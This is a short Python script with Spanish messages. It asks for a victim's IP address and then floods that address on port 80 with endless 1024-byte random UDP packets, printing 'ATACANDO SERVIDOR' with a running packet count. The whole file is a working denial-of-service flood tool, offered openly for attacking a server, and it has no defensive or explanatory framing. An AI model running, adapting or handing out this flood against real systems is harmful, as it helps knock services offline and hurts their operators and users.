#!/bin/python3
import socket
import random 
import sys
import threading
import time

peticion = 0
target_ip = input("Ingresa la direccion IP de la victima: ")
target_port = 80



def random_string(length):
    letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    return "".join(random.choice(letters) for i in range(length))

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

while True:
    client.sendto(bytes, (target_ip, target_port))
    print("ATACANDO SERVIDOR, el numero de peticion es: ", peticion)
    peticion += 1